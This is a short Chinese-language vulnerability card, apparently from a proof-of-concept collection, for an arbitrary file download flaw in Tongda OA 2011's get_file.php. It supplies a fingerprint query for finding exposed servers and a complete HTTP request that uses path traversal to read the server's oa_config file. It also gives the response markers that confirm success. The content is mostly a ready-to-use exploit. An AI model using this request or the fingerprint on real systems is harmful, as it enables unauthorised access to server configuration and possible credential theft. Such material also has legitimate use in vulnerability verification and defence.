﻿# 通达OA get_file任意文件下载漏洞

> 更新时间：2023-12-25

> 漏洞编号：

> 漏洞说明：通达OA get_file.php文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件。影响版本 通达OA2011

> 漏洞特征：title="office Anywhere" && icon_hash="-759108386" && "2011"

> 验证脚本：HTTP

```
GET /module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=lrvmku93t8g0ce7b90qaroic96; KEY_RANDOMDATA=10603
Upgrade-Insecure-Requests: 1
```

> 响应代码特征：200

> 响应内容特征：ROOT_PATH

> 上传文件定位：


> 验证文件来源：通达OA get_file任意文件下载漏洞.poc
